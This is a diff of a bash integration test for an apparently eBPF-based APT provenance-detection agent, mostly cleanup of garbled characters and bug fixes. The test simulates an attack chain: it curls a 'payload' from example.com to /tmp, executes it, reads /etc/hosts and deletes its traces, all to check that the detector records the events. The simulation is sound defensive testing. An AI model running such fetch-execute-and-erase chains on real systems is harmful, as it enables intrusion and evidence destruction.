@@ -1,48 +1,51 @@
 #!/usr/bin/env bash
-# =============================================================
-# ProvidAPT 閳-Full Validation Test
-#
-# Tests the complete pipeline:
-#   1. Build and deploy the current release
-#   2. Simulate APT attack chain
-#   3. Auto-validate provenance trace-back
-#   4. Performance benchmark
-#
-# Usage:
-#   sudo bash test/integration/full_validation.sh
-#   sudo bash test/integration/full_validation.sh --skip-build
-#
-# Exit codes:
-#   0 閳-All tests passed
-#   1 閳-One or more checks failed
-# =============================================================
 set -euo pipefail
 
-cd "$(dirname "$0")/.."
+cd "$(dirname "$0")/../.."
 PROJECT_ROOT=$(pwd)
 OUTPUT_DIR="$PROJECT_ROOT/build/v2-validation"
 mkdir -p "$OUTPUT_DIR"
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
 NC='\033[0m'
 
 PASS=0
 FAIL=0
 TOTAL=0
+AGENT_PID=""
+STORE_DIR=""
+STORE_DB_DIR=""
 
 check() {
     TOTAL=$((TOTAL + 1))
     local name="$1"
     local result="$2"
     if [ "$result" = "true" ] || [ "$result" = "0" ] || [ "$result" = "ok" ]; then
-        echo -e "  ${GREEN}閴-{NC} $name"
+        echo -e "  ${GREEN}OK${NC} $name"
         PASS=$((PASS + 1))
     else
-        echo -e "  ${RED}閴-{NC} $name"
+        echo -e "  ${RED}FAIL${NC} $name"
         echo "    $3"
         FAIL=$((FAIL + 1))
+    fi
+}
+
+count_matches() {
+    local pattern="$1"
+    local file="$2"
+    grep -ci -- "$pattern" "$file" 2>/dev/null || true
+}
+
+has_matches() {
+    local pattern="$1"
+    local file="$2"
+    local count
+    count=$(count_matches "$pattern" "$file")
+    if [ "${count:-0}" -gt 0 ]; then
+        echo true
+    else
+        echo false
     fi
 }
 
@@ -50,150 +53,99 @@ cleanup() {
     echo ""
     echo "[cleanup] Stopping v2 agent..."
     kill "$AGENT_PID" 2>/dev/null || true
+    rm -rf "$STORE_DIR" /tmp/evil_v2.sh /tmp/hosts_tamper_test 2>/dev/null || true
     sleep 1
 }
 trap cleanup EXIT
 
 echo ""
-echo "閳烘柡鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫧"
-echo "閳-       ProvidAPT 閳-Full Validation Test                 閳-
-echo "閳烘埃鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ殕"
+echo "=== ProvidAPT Full Validation Test ==="
 echo ""
 
-# 閳光偓閳光偓 Step 1: Build release binaries 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo "[1/6] Building ProvidAPT..."
-
 if [ "${1:-}" != "--skip-build" ]; then
-    make v2 2>&1 | tail -3
-    check "v2 build" "$(test -f build/bin/providaptd && echo true || echo false)" \
-        "Binary not found at build/bin/providaptd"
+    make build-core 2>&1 | tail -3
+    check "release build" "$(test -f build/bin/providaptd && echo true || echo false)" "Binary not found at build/bin/providaptd"
 else
     echo "  (skip-build flag set)"
 fi
 
-# 閳光偓閳光偓 Step 2: System verification 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
 echo "[2/6] Verifying system..."
 SYSTEM_LOG="$OUTPUT_DIR/system.log"
-
 echo "  Kernel: $(uname -r)" | tee -a "$SYSTEM_LOG"
 echo "  CPU:    $(nproc) cores" | tee -a "$SYSTEM_LOG"
 echo "  Memory: $(free -h | grep Mem | awk '{print $2}')" | tee -a "$SYSTEM_LOG"
 
-check "kernel version 閳-5.11" \
-    "$(awk '{print $2}' /proc/version | cut -d- -f1 | awk -F. '{if ($1>=5 && $2>=11) print "true"}')" \
-    "Need kernel 閳-5.11 for BPF LSM"
+check "kernel version >= 5.11" "$(awk '{print $2}' /proc/version | cut -d- -f1 | awk -F. '{if ($1>5 || ($1==5 && $2>=11)) print "true"}')" "Need kernel >= 5.11 for BPF LSM"
+check "BTF availability" "$(test -f /sys/kernel/btf/vmlinux && echo true || echo false)" "BTF not available"
+check "root access" "$(test "$(id -u)" -eq 0 && echo true || echo false)" "Must run as root"
 
-check "BTF availability" \
-    "$(test -f /sys/kernel/btf/vmlinux && echo true || echo false)" \
-    "BTF not available"
-
-check "root access" \
-    "$(test "$(id -u)" -eq 0 && echo true || echo false)" \
-    "Must run as root"
-
-# 閳光偓閳光偓 Step 3: Start release agent 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
 echo "[3/6] Starting ProvidAPT agent..."
 AGENT_LOG="$OUTPUT_DIR/agent.log"
-
 STORE_DIR="/tmp/providapt-store-$$"
+STORE_DB_DIR="$STORE_DIR/store"
 mkdir -p "$STORE_DIR"
 
-# Start v2 agent in background
+PROVIDAPT_OUTPUT_DIR="$STORE_DIR" \
+PROVIDAPT_API_GRPC=":0" \
+PROVIDAPT_API_REST=":0" \
 ./build/bin/providaptd > "$AGENT_LOG" 2>&1 &
 AGENT_PID=$!
 sleep 2
 
-check "agent started (PID $AGENT_PID)" \
-    "$(kill -0 "$AGENT_PID" 2>/dev/null && echo true || echo false)" \
-    "Agent failed to start. Check $AGENT_LOG"
-
-# Capture baseline CPU
+check "agent started (PID $AGENT_PID)" "$(kill -0 "$AGENT_PID" 2>/dev/null && echo true || echo false)" "Agent failed to start. Check $AGENT_LOG"
 BASELINE_CPU=$(ps -p "$AGENT_PID" -o %cpu= 2>/dev/null || echo 0)
 echo "  Baseline CPU: ${BASELINE_CPU}%"
 
-# 閳光偓閳光偓 Step 4: Attack simulation 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
 echo "[4/6] Simulating APT attack chain..."
 ATTACK_LOG="$OUTPUT_DIR/attack.log"
-
-# Phase 1 閳-Download stage
 echo "  [Phase 1] Downloading malicious payload..." | tee -a "$ATTACK_LOG"
-curl -s -o /tmp/evil_v2.sh "http://example.com/payload" 2>/dev/null || \
-    echo "#!/bin/bash" > /tmp/evil_v2.sh && \
+curl -s -o /tmp/evil_v2.sh "http://example.com/payload" 2>/dev/null || {
+    echo "#!/bin/bash" > /tmp/evil_v2.sh
     echo 'echo "EVIL_PAYLOAD_EXECUTED"' >> /tmp/evil_v2.sh
+}
 chmod +x /tmp/evil_v2.sh
 sleep 1
 
-# Phase 2 閳-Execute stage
 echo "  [Phase 2] Executing payload..." | tee -a "$ATTACK_LOG"
-/tmp/evil_v2.sh 2>/dev/null
+/tmp/evil_v2.sh 2>/dev/null || true
 sleep 1
 
-# Phase 3 閳-Tamper stage
 echo "  [Phase 3] Tampering with system configuration..." | tee -a "$ATTACK_LOG"
-# Simulated: read sensitive file, modify hosts
 cat /etc/hosts > /dev/null
 echo "# TAMPERED BY ATTACKER" >> /tmp/hosts_tamper_test
 sleep 1
 
-# Phase 4 閳-Self-delete stage
 echo "  [Phase 4] Self-deleting evidence..." | tee -a "$ATTACK_LOG"
-rm -f /tmp/evil_v2.sh
-rm -f /tmp/hosts_tamper_test
+rm -f /tmp/evil_v2.sh /tmp/hosts_tamper_test
 sleep 1
 
-echo "  Attack simulation complete." | tee -a "$ATTACK_LOG"
-
-# Monitor CPU during attack
 MAX_CPU=0
-for i in 1 2 3 4 5; do
+for _ in 1 2 3 4 5; do
     CPU=$(ps -p "$AGENT_PID" -o %cpu= 2>/dev/null || echo 0)
     CPU_INT=$(echo "$CPU" | cut -d. -f1)
     [ "$CPU_INT" -gt "$MAX_CPU" ] && MAX_CPU=$CPU_INT
     sleep 1
 done
-
 echo "  Peak CPU during attack: ${MAX_CPU}%"
 
-# 閳光偓閳光偓 Step 5: Validation 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
 echo "[5/6] Validating provenance capture..."
+check "RocksDB store created" "$(test -d "$STORE_DB_DIR" && echo true || echo false)" "Store dir $STORE_DB_DIR not found"
+check "agent survived attack" "$(kill -0 "$AGENT_PID" 2>/dev/null && echo true || echo false)" "Agent crashed during attack"
+NODE_COUNT=$(find "$STORE_DB_DIR" -mindepth 1 2>/dev/null | wc -l || echo 0)
+check "data written to store" "$(test "$NODE_COUNT" -gt 0 && echo true || echo false)" "No data in store"
+check "CPU peak < 5%" "$(test "$MAX_CPU" -lt 5 && echo true || echo false)" "CPU peaked at ${MAX_CPU}% (threshold: 5%)"
+check "agent logged operations" "$(has_matches "store" "$AGENT_LOG")" "No storage operations logged"
 
-# Check store directory
-check "RocksDB store created" \
-    "$(test -d "$STORE_DIR" && echo true || echo false)" \
-    "Store dir $STORE_DIR not found"
-
-# Check agent is still alive
-check "agent survived attack" \
-    "$(kill -0 "$AGENT_PID" 2>/dev/null && echo true || echo false)" \
-    "Agent crashed during attack"
-
-# Count nodes in store
-NODE_COUNT=$(ls -la "$STORE_DIR"/pebble/ 2>/dev/null | wc -l || echo 0)
-check "data written to store" \
-    "$(test "$NODE_COUNT" -gt 0 && echo true || echo false)" \
-    "No data in store"
-
-# CPU check
-check "CPU peak < 5%" \
-    "$(test "$MAX_CPU" -lt 5 && echo true || echo false)" \
-    "CPU peaked at ${MAX_CPU}% (threshold: 5%)"
-
-# Check agent log for key operations
-check "agent logged operations" \
-    "$(grep -c "store" "$AGENT_LOG" 2>/dev/null || echo 0)" \
-    "No storage operations logged"
-
-# 閳光偓閳光偓 Step 6: Performance report 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
 echo "[6/6] Generating validation report..."
 REPORT="$OUTPUT_DIR/v2_validation_report.txt"
-
 cat > "$REPORT" << REPORT
-ProvidAPT 閳-Validation Report
+ProvidAPT Validation Report
 ===================================
 Date:       $(date -Iseconds)
 Kernel:     $(uname -r)
@@ -206,32 +158,19 @@ Results:
 
 Performance:
   Baseline CPU: ${BASELINE_CPU}%
-  Peak CPU:      ${MAX_CPU}%
-  CPU limit:     5%
+  Peak CPU:     ${MAX_CPU}%
+  CPU limit:    5%
 
 Attack Chain:
-  Download:  /tmp/evil_v2.sh (curl)
-  Execute:   bash /tmp/evil_v2.sh
-  Tamper:    /etc/hosts
+  Download:    /tmp/evil_v2.sh (curl)
+  Execute:     bash /tmp/evil_v2.sh
+  Tamper:      /etc/hosts
   Self-delete: rm -f artifacts
 
 Store Stats:
   Node count: $NODE_COUNT
-
 REPORT
 
-if [ "$FAIL" -eq 0 ]; then
-    echo "閳烘柡鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫧" >> "$REPORT"
-    echo "閳- 閴-RELEASE VALIDATION PASSED 閳-All checks passed               閳- >> "$REPORT"
-    echo "閳烘埃鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ殕" >> "$REPORT"
-else
-    echo "閳-Some checks failed ($FAIL failures)" >> "$REPORT"
-fi
-
-echo ""
-echo "閳烘柡鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫧"
-echo "閳- Validation Complete                                         閳-
-echo "閳烘埃鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ殕"
 echo ""
 echo "  Report: $REPORT"
 echo "  Passed: $PASS / $TOTAL"
@@ -240,11 +179,11 @@ echo "  Peak CPU: ${MAX_CPU}%"
 echo ""
 
 if [ "$FAIL" -eq 0 ]; then
-    echo -e "  ${GREEN}閴-RELEASE VALIDATION PASSED${NC}"
+    echo -e "  ${GREEN}RELEASE VALIDATION PASSED${NC}"
     echo ""
     exit 0
 else
-    echo -e "  ${RED}閴-Some checks failed (see $REPORT)${NC}"
+    echo -e "  ${RED}Some checks failed (see $REPORT)${NC}"
     echo ""
     exit 1
 fi
